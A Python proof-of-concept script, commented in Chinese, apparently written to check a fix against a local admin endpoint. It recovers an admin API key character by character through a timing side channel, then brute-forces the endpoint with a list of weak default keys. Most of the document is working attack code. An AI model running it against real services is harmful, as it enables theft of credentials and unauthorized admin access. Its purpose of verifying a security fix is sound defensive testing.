"""
时序侧信道攻击 PoC —— 逐字符猜解 Admin API Key
攻击原理：Python 的 != 操作符在第一个不匹配字符处短路返回，
        造成可观测的时间差异。每个字符的匹配/不匹配在
        网络往返时间上产生纳秒-微秒级差异，统计学上可提取。
"""
import time
import requests
import statistics

TARGET = "http://127.0.0.1:8888/admin/stats"
SAMPLES_PER_CHAR = 50      # 每个候选字符的采样数
CHARACTER_SET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"

def measure_attempt(guess: str) -> float:
    """测量一次请求的往返时间（排除连接建立时间）"""
    headers = {"X-Admin-API-Key": guess}
    start = time.perf_counter()
    try:
        r = requests.get(TARGET, headers=headers, timeout=10)
        elapsed = time.perf_counter() - start
        return elapsed * 1_000_000  # 微秒
    except Exception:
        return None

def find_next_char(known_prefix: str) -> dict:
    """对每个候选字符采样 N 次，找出耗时最长的那个"""
    results = {}
    print(f"\n[*] 已知前缀: '{known_prefix}'  —  正在测试候选字符...")

    for c in CHARACTER_SET:
        guess = known_prefix + c + "x" * (64 - len(known_prefix) - 1)
        times = []
        for _ in range(SAMPLES_PER_CHAR):
            t = measure_attempt(guess)
            if t is not None:
                times.append(t)

        if times:
            results[c] = {
                "mean": statistics.mean(times),
                "median": statistics.median(times),
                "stdev": statistics.stdev(times) if len(times) > 1 else 0,
            }

    # 找出统计上显著更慢的候选字符 (匹配更多字符 → 更多字符串比较 → 稍高耗时)
    if not results:
        return {}

    # 按平均时间降序排列
    sorted_chars = sorted(results.items(), key=lambda x: x[1]["mean"], reverse=True)

    print(f"    Top 5 候选:")
    for c, stats in sorted_chars[:5]:
        marker = " ← 候选" if sorted_chars.index((c, stats)) == 0 else ""
        print(f"      '{known_prefix}{c}'  mean={stats['mean']:.1f}μs  median={stats['median']:.1f}μs (±{stats['stdev']:.1f}){marker}")

    return sorted_chars[0][0] if sorted_chars else None


if __name__ == "__main__":
    print("=" * 65)
    print(" 时序侧信道攻击 — Admin Key 逐字符破解")
    print("=" * 65)
    print(f"目标: {TARGET}")
    print(f"每字符采样: {SAMPLES_PER_CHAR} 次")
    print(f"字符集大小: {len(CHARACTER_SET)}")
    print(f"总请求数(预估): {len(CHARACTER_SET)} × {SAMPLES_PER_CHAR} × 64")
    print(f"  = 保守估计 {len(CHARACTER_SET) * SAMPLES_PER_CHAR * 10:,} 次请求 (只测前10字符)")

    # 演示：已知你用 secrets.compare_digest 修复了，我们先验证旧版本是否漏洞存在
    # 测试两个确定的 key 来验证侧信道
    print("\n[Phase 1] 验证侧信道可行性...")
    print("  测试正确的 key vs 随机的 key 之间的时间差...")

    # 使用无效但长度相同的 key
    fake_key_1 = "a" * 64
    fake_key_2 = "b" * 64

    times_1 = []
    times_2 = []
    for _ in range(100):
        t = measure_attempt(fake_key_1)
        if t: times_1.append(t)
        t = measure_attempt(fake_key_2)
        if t: times_2.append(t)

    if times_1 and times_2:
        m1 = statistics.mean(times_1)
        m2 = statistics.mean(times_2)
        diff = abs(m1 - m2)
        print(f"  Key 'aaa...' mean: {m1:.1f}μs (±{statistics.stdev(times_1):.1f})")
        print(f"  Key 'bbb...' mean: {m2:.1f}μs (±{statistics.stdev(times_2):.1f})")
        print(f"  时间差: {diff:.1f}μs")

        # 如果用了 compare_digest，应该没有显著差异
        if diff < max(statistics.stdev(times_1), statistics.stdev(times_2)) * 2:
            print("\n  ✅ 两个 key 的响应时间无统计显著差异")
            print("     说明 secrets.compare_digest 正在有效工作")
            print("     侧信道攻击在当前版本中已被防御！")
        else:
            print("\n  ⚠️  存在可观测时间差异！")
            print("     侧信道攻击可能可行")

    print("\n[Phase 2] 即使时序攻击已被防御，攻击者仍可尝试...")
    print("  暴力枚举弱密钥...")

    # 尝试常见弱密钥
    WEAK_KEYS = [
        "admin-dev-key-change-in-production",  # 原默认值
        "admin",
        "admin123",
        "password",
        "changeme",
        "secret",
        "test",
        "dev",
        "admin-key",
        "sk-admin",
        "admin-api-key",
        "admin-dev",
        "development",
    ]

    print(f"\n  正在尝试 {len(WEAK_KEYS)} 个常见弱密钥...")
    for key in WEAK_KEYS:
        headers = {"X-Admin-API-Key": key}
        try:
            r = requests.get(TARGET, headers=headers, timeout=5)
            if r.status_code != 403:
                print(f"  🔴 发现有效密钥: {key} (HTTP {r.status_code})")
                print(f"     响应: {r.text[:200]}")
                break
            else:
                print(f"     ❌ {key} — 403 (无效)")
        except Exception as e:
            print(f"     ⚠️  {key} — 连接失败: {e}")

    print("\n" + "=" * 65)
    print(" 结论: 修复后的 secrets.compare_digest + 强随机密钥 = 安全")
    print("=" * 65)
